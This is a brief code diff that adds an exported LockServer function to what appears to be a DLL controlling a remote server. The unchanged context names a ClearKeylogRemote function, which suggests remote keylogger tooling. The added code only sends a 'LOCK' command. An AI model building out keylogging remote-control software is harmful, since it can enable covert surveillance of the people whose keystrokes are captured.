@@ -605,3 +605,9 @@ DLLEXPORT void ClearKeylogRemote() {
     
     sendCommandInternal("QUIT");
 }
+
+DLLEXPORT void LockServer() {
+    if (clientSocket != INVALID_SOCKET) {
+        sendCommandInternal("LOCK");
+    }
+}
